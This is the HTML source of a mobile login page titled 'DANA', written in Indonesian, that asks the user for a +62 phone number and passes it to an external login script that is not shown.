<html>
	<head>
		<title>DANA</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="stylesheet" href="assets/common/css/global.css">
		<link rel="stylesheet" href="assets/common/css/login.css">
		<link rel="stylesheet" href="assets/common/css/loader.css">
		<script src="assets/lib/jquery/jquery.js"></script>
		<script>
			const module = {};
		</script>
		<script type="module" src="assets/common/js/login.js"></script>
		<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
	</head>
	<body>
		<div style="background-color: #118EEA; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center;">
			<img src="assets/common/img/logo1.png" style="width: 100px; height: 70px; object-fit: fill;">
			<div style="color: #ffffff; font-size: 14px; margin-top: 10px;">
				Masukkan nomor HP kamu untuk lanjut
			</div>
			<div style="width: calc(100% - 50px); margin-left: 20px; margin-right: 20px; margin-top: 30px; display: flex; flex-direction: row; align-items: center;">
				<div style="display: flex; flex-direction: column;">
					<div style="color: #ffffff; font-size: 12px;">Negara</div>
				    <div style="height: 40px; margin-top: 5px; padding-left: 0; padding-right: 5px; background-color: #ffffff; border-radius: 5px; display: flex; flex-direction: row; align-items: center;">
					    <img src="assets/common/img/id_flag.png" style="width: 20px; height: 15px; object-fit: fill; margin-left: 10px;">
				    	<div style="color: #000000; font-size: 15px; margin-left: 5px; margin-right: 5px;"><b>+62</b></div>
				    </div>
				</div>
				<div style="margin-left: 5px; display: flex; flex-direction: column;">
					<div style="color: #ffffff; font-size: 12px;">Nomor</div>
				    <div style="height: 40px; margin-top: 5px; padding-left: 5px; padding-right: 5px; background-color: #ffffff; border-radius: 5px; display: flex; flex-direction: row; align-items: center;">
					    <input id="phone" class="input1" type="tel" maxlength="16" placeholder="812-3456-7890" style="flex: 1; height: 100%; color: #000000; font-size: 15px; border: 0; outline: 0; background-color: transparent; font-weight: bold;">
				    </div>
				</div>
			</div>
			<div id="login2" onclick="module.login()" style="display: none; width: calc(100% - 50px); height: 50px; margin-top: 10px; background-color: #ffffff; justify-content: center; align-items: center; color: #888888; font-size: 17px; border-radius: 5px;">
				LANJUTKAN
			</div>
			<div style="margin-left: 20px; margin-right: 20px; color: #ffffff; font-size: 14px; margin-top: 30px; text-align: center;">
				Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan <b>S&K</b> serta <b>Kebijakan Privasi</b> kami.
			</div>
			<div id="login" onclick="module.login()" style="position: fixed; left: 10px; bottom: 10px; width: calc(100% - 20px); height: 50px; background-color: #ffffff; display: flex; justify-content: center; align-items: center; color: #888888; font-size: 17px; border-radius: 5px;">
				LANJUTKAN
			</div>
			<div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
				<div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
					<div class="loader" style="width: 50px; height: 50px;"></div>
				</div>
			</div>
		</div>
	</body>
</html>
